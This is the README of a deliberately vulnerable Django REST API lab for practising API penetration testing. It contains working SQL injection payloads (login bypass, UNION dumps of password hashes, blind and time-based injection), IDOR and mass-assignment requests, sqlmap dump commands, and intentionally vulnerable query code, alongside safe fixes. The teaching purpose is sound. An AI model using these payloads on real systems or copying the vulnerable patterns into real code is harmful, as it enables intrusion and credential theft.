# VulnAPI Lab — Deliberately Vulnerable REST API

A complete, self-contained vulnerable REST API built with Django and SQLite/MySQL, designed exclusively for learning, teaching, and practicing API penetration testing in a safe, isolated lab environment. It includes token authentication, a product catalog API, user profiles, comments, audit logging, and multiple vulnerable endpoints — plus a safe "twin" endpoint for side-by-side comparison.

> ⚠️ Disclaimer: This API contains _intentional, severe security vulnerabilities_. Deploy it only on `127.0.0.1` or an isolated lab network. Never expose it to the internet, and never point testing tools at systems you do not own or have explicit written authorization to test. The authors accept no liability for misuse.

---

## 📋 Table of Contents

- [Features](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-features)
- [Vulnerability Map](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-vulnerability-map)
- [Tech Stack](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-tech-stack)
- [Project Structure](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-project-structure)
- [Installation](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-installation)
- [Running the API](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-running-the-api)
- [Seeded Users](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-seeded-users)
- [API Reference](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-api-reference)
- [Practice Attacks & Payloads](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-practice-attacks--payloads)
- [Vulnerable vs. Safe Comparison](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-vulnerable-vs-safe-comparison)
- [Suggested Learning Exercises](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-suggested-learning-exercises)
- [Recommended Tools](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-recommended-tools)
- [Root Cause Analysis](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-root-cause-analysis)
- [Remediation Reference](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-remediation-reference)
- [Troubleshooting](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-troubleshooting)
- [License](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-license)

---

## ✨ Features

- Pure JSON REST API — no HTML frontend, ideal for curl, Burp Suite, Postman, and automated tooling
- Token-based authentication (custom Bearer tokens with a real Django session established on login)
- Full product API: search, detail, create
- User profile endpoint, comment endpoint, and an "admin stats" endpoint
- Vulnerable endpoints covering major API vulnerability classes:
    - Authentication bypass (SQL injection in login)
    - UNION-based data extraction
    - Numeric/URL-parameter injection
    - INSERT injection + mass assignment
    - IDOR / broken object-level authorization
    - Boolean-blind injection (true/false oracle)
    - Error-based disclosure (raw DB errors in JSON responses)
    - Missing function-level authorization (admin stats with no role check)
- A safe twin endpoint (`/api/safe/products/`) using parameterized queries as a control group
- Seeded demo data via a single management command
- Works with SQLite out of the box; MySQL optional (enables `SLEEP()` payloads)

---

## 🐞 Vulnerability Map

|#|Endpoint|Vulnerability Class|Root Cause|
|---|---|---|---|
|1|`POST /api/auth/login/`|Authentication bypass|Credentials concatenated into raw SQL|
|2|`POST /api/auth/login/`|Error-based disclosure|Raw DB exception returned in JSON|
|3|`GET /api/vuln/products/?q=&category=`|UNION-based SQLi, blind SQLi|`q`/`category` f-stringed into `WHERE`|
|4|`GET /api/vuln/products/<id>/`|Numeric SQLi + unauthenticated access|URL param interpolated raw; no auth check|
|5|`POST /api/vuln/products/create/`|Mass assignment + INSERT injection|Client-controlled `owner_id`; concatenated INSERT|
|6|`GET /api/vuln/profile/?id=`|IDOR + SQLi|No ownership check; `id` injected into SQL|
|7|`GET /api/vuln/admin/stats/?filter=`|Boolean-blind SQLi + missing function-level auth|Concatenated `filter`; no role check; response is a true/false oracle|
|8|`GET /api/safe/products/?q=`|✅ Safe — parameterized query (control group)|—|

---

## 🛠 Tech Stack

- Backend: Python 3.10+, Django 4.2
- Database: SQLite (default) or MySQL (optional)
- Auth: Custom Bearer tokens (`ApiToken` model) + Django sessions
- Format: JSON only (`JsonResponse`), CSRF-exempt by design (API lab)

---

## 📁 Project Structure

```
vulnapi/
├── manage.py
├── requirements.txt
├── vulnapi/
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
└── api/
    ├── models.py
    ├── views.py
    ├── urls.py
    ├── auth.py
    ├── management/
    │   └── commands/
    │       └── seed.py
```

---

## 🚀 Installation

### 1. Clone and enter the project

bash

```
git clone https://github.com/<your-username>/vulnapi.git
cd vulnapi
```

### 2. Create a virtual environment

bash

```
python -m venv venv
source venv/bin/activate        # Linux/macOS
# venv\Scripts\activate         # Windows
```

### 3. Install dependencies

`requirements.txt`:

```
Django>=4.2,<5.0
```

bash

```
pip install -r requirements.txt
```

### 4. (Optional) Switch to MySQL

Edit `vulnapi/settings.py`:

python

```
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'vulnapi',
        'USER': 'root',
        'PASSWORD': 'root',
        'HOST': '127.0.0.1',
        'PORT': '3306',
    }
}
```

Requires `pip install mysqlclient` and a running MySQL server. MySQL enables time-based blind payloads (`SLEEP(5)`), which SQLite does not support.

---

## ▶️ Running the API

bash

```
python manage.py migrate       # create tables
python manage.py seed          # insert demo users & products
python manage.py runserver     # start on http://127.0.0.1:8000
```

Health check:

bash

```
curl -s http://127.0.0.1:8000/api/safe/products/?q=laptop
```

---

## 👤 Seeded Users

|Username|Password|Owns|
|---|---|---|
|`admin`|`S3cr3tAdmin!`|Laptop Pro 15|
|`alice`|`AlicePass123`|Wireless Mouse, Running Shoes|
|`bob`|`BobPass456`|Coffee Maker (+ sample comments)|

Passwords are stored as Django PBKDF2 hashes — a teaching moment when UNION extraction returns `$pbkdf2-sha256$...` strings instead of plaintext.

---

## 📡 API Reference

### Authentication

|Method|Endpoint|Auth|Description|
|---|---|---|---|
|POST|`/api/auth/login/`|❌|Obtain Bearer token (VULNERABLE)|

json

```
// Request
{"username": "alice", "password": "AlicePass123"}
// Response 200
{"token": "<64-hex-token>", "username": "alice"}
```

### Products

|Method|Endpoint|Auth|Description|
|---|---|---|---|
|GET|`/api/vuln/products/?q=&category=`|❌|Search products (VULNERABLE SQLi)|
|GET|`/api/vuln/products/<id>/`|❌|Product detail (VULNERABLE SQLi, no auth)|
|POST|`/api/vuln/products/create/`|Bearer|Create product (VULNERABLE mass assignment + INSERT injection)|
|GET|`/api/safe/products/?q=`|❌|Safe search (parameterized — control group)|

### Profile & Misc

|Method|Endpoint|Auth|Description|
|---|---|---|---|
|GET|`/api/vuln/profile/?id=<n>`|Bearer|Read any user's profile (VULNERABLE IDOR + SQLi)|
|GET|`/api/vuln/admin/stats/?filter=`|❌|Boolean oracle (VULNERABLE blind SQLi, no role check)|
|POST|`/api/products/<id>/comments/`|Bearer|Add comment (safe/normal CRUD)|

All authenticated endpoints expect:

```
Authorization: Bearer <token>
```

---

## 🎯 Practice Attacks & Payloads

> Tip: URL-encode payloads in browsers, or send raw payloads via curl/Burp Repeater. `--` in SQL needs a trailing space in some contexts.

### 0. Get a token (baseline)

bash

```
curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"AlicePass123"}'
```

### 1. Authentication bypass — login as any user without a password

bash

```
curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'"'"' --","password":"anything"}'
```

The `admin' --` payload comments out the password check → valid token for `admin` is returned.

### 2. Error-based disclosure

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/products/?q=%27"
```

→ `"error": "database_error", "detail": "...sqlite3.OperationalError..."` — leaks the DB engine, table, and SQL fragment.

### 3. UNION-based extraction — dump all users' password hashes

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/products/?q=%27%20UNION%20SELECT%20id,username,password,'x'%20FROM%20auth_user%20--%20"
```

### 4. Numeric injection on the detail endpoint

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/products/1%20OR%201=1/"
```

→ Returns the first product regardless of the requested ID. Also note: this endpoint requires no authentication at all.

### 5. IDOR — read admin's profile as alice

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/profile/?id=1" \
  -H "Authorization: Bearer <alice-token>"
```

→ Returns admin's email/username. There is no check that `id == alice.id` — classic broken object-level authorization (API1 in the OWASP API Top 10).

### 6. Mass assignment — claim someone else's product ownership

bash

```
curl -s -X POST http://127.0.0.1:8000/api/vuln/products/create/ \
  -H "Authorization: Bearer <alice-token>" \
  -H 'Content-Type: application/json' \
  -d '{"name":"Hack","description":"x","price":"1","category":"Toys","owner_id":1}'
```

→ The client-supplied `owner_id` is trusted; the product is created as owned by `admin` (id 1). The `price` value is also injected raw into the INSERT — try `"price": "1, 'Electronics', 1) -- "` to explore INSERT injection.

### 7. Boolean-blind injection — extract data through a true/false oracle

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/admin/stats/?filter=x' OR 1=1 -- "   # {"result": true}
curl -s "http://127.0.0.1:8000/api/vuln/admin/stats/?filter=x' AND 1=2 -- "  # {"result": false}
curl -s "http://127.0.0.1:8000/api/vuln/admin/stats/?filter=x' AND SUBSTR((SELECT password FROM auth_user WHERE id=1),1,1)='$' -- "
```

→ By testing characters one at a time, the full admin password hash can be extracted with no error messages and no data in the response. Also note this "admin" endpoint has no role check — any anonymous user can query it.

### 8. Time-based blind (MySQL only)

bash

```
curl -s "http://127.0.0.1:8000/api/vuln/products/?q=%27%20AND%20SLEEP(5)%20--%20"
```

→ Response delayed ~5 s. SQLite alternative: `%' AND 1=randomblob(200000000) --`.

### 9. Verify the safe endpoint is immune

bash

```
curl -s "http://127.0.0.1:8000/api/safe/products/?q=%27%20OR%20%271%27%3D%271"
```

→ Payload is treated as literal search text; no special behavior. This is the fix demonstration.

---

## ⚖️ Vulnerable vs. Safe Comparison

The core teaching moment — identical feature, two implementations:

python

```
# VULNERABLE (views.py — vuln_products)
sql = ("SELECT id, name, price, category FROM api_product "
       f"WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'")
cur.execute(sql)                            # input changes query structure!

# SAFE (views.py — safe_products)
sql = ("SELECT id, name, price, category FROM api_product "
       "WHERE name LIKE %s OR description LIKE %s")
cur.execute(sql, [f'%{q}%', f'%{q}%'])      # input is always data, never code
```

Send every payload from the section above to both endpoints and observe that only the vulnerable one is exploitable.

---

## 📚 Suggested Learning Exercises

1. Recon — enumerate the API surface manually, then with ffuf/dirsearch wordlists. Find the undocumented-vulnerable endpoints.
2. Detect — confirm SQLi on `/api/vuln/products/` using error messages, tautologies, and response-size differences — manually, no tools.
3. Exploit (UNION) — determine column count (`ORDER BY n` / NULL-counting), then dump `auth_user`.
4. Exploit (blind) — extract admin's password hash character-by-character via the boolean oracle on `/api/vuln/admin/stats/`.
5. Bypass auth — obtain an admin token via the login bypass; compare its privileges with alice's.
6. IDOR — as alice, enumerate all user IDs on `/api/vuln/profile/` and record leaked data.
7. Mass assignment — create a product owned by admin, then think about impact: what would this mean in a billing/permissions context?
8. Automate — reproduce findings #3 and #7 with sqlmap; compare with manual results.
9. Fix & verify — patch `vuln_products` and `vuln_profile` using the parameterized pattern and an ownership check; re-run all payloads and confirm they fail.
10. Write it up — produce a pentest report: findings, severity (CVSS), evidence (requests/responses), remediation.

---

## 🔧 Recommended Tools

|Tool|Purpose|
|---|---|
|curl / httpie|Manual request crafting|
|Burp Suite (Community)|Intercept, Repeater, Intruder fuzzing|
|sqlmap|Automated SQLi detection & extraction|
|ffuf / wfuzz / dirsearch|Endpoint & parameter fuzzing|
|Postman / Insomnia|API exploration, collection-based testing|
|OWASP ZAP|Scanner baseline + API scan|
|jwt-tool / custom scripts|(if you extend the lab with JWT auth)|

Example sqlmap runs:

bash

```
# UNION extraction on search
sqlmap -u "http://127.0.0.1:8000/api/vuln/products/?q=test" --batch --dump -T auth_user

# Boolean-blind on the stats oracle
sqlmap -u "http://127.0.0.1:8000/api/vuln/admin/stats/?filter=x" --technique=B --batch

# Login bypass via JSON body (asterisks mark injectable points)
sqlmap -u "http://127.0.0.1:8000/api/auth/login/" \
  --data='{"username":"*","password":"*"}' --headers='Content-Type: application/json' --batch
```

Endpoint fuzzing example:

bash

```
ffuf -u http://127.0.0.1:8000/api/vuln/FUZZ -w /path/to/wordlist.txt -mc 200,500
```

---

## 🧠 Root Cause Analysis

Every vulnerability in this lab traces back to a small set of anti-patterns:

1. String-concatenated SQL — user input is f-stringed directly into queries (`WHERE id = {product_id}`), letting input escape the data context and become executable SQL.
2. Trusting client input — the API accepts fields it shouldn't (`owner_id` in create requests) and trusts object references without ownership checks (`profile/?id=`).
3. Missing access control — several endpoints skip authentication (`product detail`) or role checks (`admin/stats`).
4. Verbose errors — raw database exceptions are returned in JSON, handing attackers schema details.

These map directly to the OWASP API Security Top 10: API1 Broken Object Level Authorization, API3 Broken Object Property Level Authorization (mass assignment), API5 Broken Function Level Authorization, API8 Security Misconfiguration (verbose errors), and API10 Unsafe Consumption of APIs patterns for injection.

---

## 🩹 Remediation Reference

For fixing the lab (or teaching secure API development):

1. Parameterized queries — always bind user input as parameters (see `safe_products`); or better, use the Django ORM (`Product.objects.filter(name__icontains=q)`).
2. Object-level authorization — on `/profile/`, enforce `id == request.user.id` unless the caller is staff.
3. Reject unexpected fields — whitelist fields on create; derive `owner_id` from the authenticated token, never from the body.
4. Function-level authorization — require a staff/superuser check on admin endpoints.
5. Authentication everywhere — the product detail endpoint should require a token.
6. Generic errors — return `{"error": "bad request"}`; log full details server-side only.
7. Input validation — cast numeric parameters with `int()`; validate types on the JSON body.

---

## 📄 License

MIT License — use freely for education and authorized training. You are solely responsible for ensuring this software and any testing performed against it are confined to systems you own or have explicit written authorization to test.a

---

## Developed In Samo Tech Labs
## by:
https://github.com/blackwolf-274/vulnapi